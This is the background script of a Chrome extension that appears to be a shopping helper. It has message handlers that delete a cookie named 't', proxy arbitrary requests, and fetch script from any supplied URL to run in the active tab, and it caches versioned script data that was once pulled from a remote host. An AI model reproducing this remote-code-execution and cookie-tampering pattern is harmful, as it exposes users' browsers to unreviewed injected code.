chrome.storage.local.set({
    hslSet: {
        hslTop: 'show',
        hslMid: 'show'
    }
});
chrome.storage.local.set({
    hslListSet: 'show'
});

function removeCookie(u, c) {
    chrome.cookies.remove({url: u, name: c.name});
}

chrome.extension.onMessage.addListener(function (request, sender, sendResponse) {
    if (request.name == "clearCook") {
        chrome.cookies.get({
            url: request.url,
            name: "t"
        }, function (b) {
            if (b && b.name) {
                removeCookie(request.url, b);
            }
            sendResponse("1");
        });
    } else if (request.name == "universal") {
        $.ajax({
            type: request.type,
            url: request.url,
            dataType: request.dataType,
            data: request.data,
            success: function (e) {
                sendResponse(e);
            }, error: function () {
                sendResponse("");
            }
        });
    } else if (request.name == "script") {
        $.ajax({
            type: "get",
            url: request.url,
            dataType: "html",
            success: function (e) {
                console.log(1);
                chrome.tabs.executeScript(null, {code: e});
            }, error: function () {
                sendResponse("");
            }
        });
    }
    return true;
});
chrome.runtime.setUninstallURL("http://www.hslyh.com/");

function addConfig(vUrl, dUrl, n, local) {
    var time = new Date().getTime();
    var dname = n + "data";
    $.ajax({
        // url: "http://file.douyapu.com/douyapu/dai360/dai360_version.json?t=" + time,
        url: "local/kekong/" + vUrl + "?t=" + time,
        dataType: "html",
        success: function (e1) {
            if (local[n] && e1 == local[n]) {
            } else {
                $.ajax({
                    // url: "http://file.douyapu.com/douyapu/dai360/dai360_sdk.js?v=" + e1 + "",
                    url: "local/kekong/" + dUrl + "?v=" + e1 + "",
                    dataType: "html",
                    success: function (e2) {
                        chrome.storage.local.set({[dname]: e2}, function () {
                        });
                        chrome.storage.local.set({[n]: e1}, function () {
                        });
                    }
                });
            }
        }
    });
}

chrome.storage.local.get(null, function (e) {
    addConfig("addv.json", "addvdata.js", "hsladdv", e);
    addConfig("switchv.json", "switchvdata.json", "hslswitchv", e);
});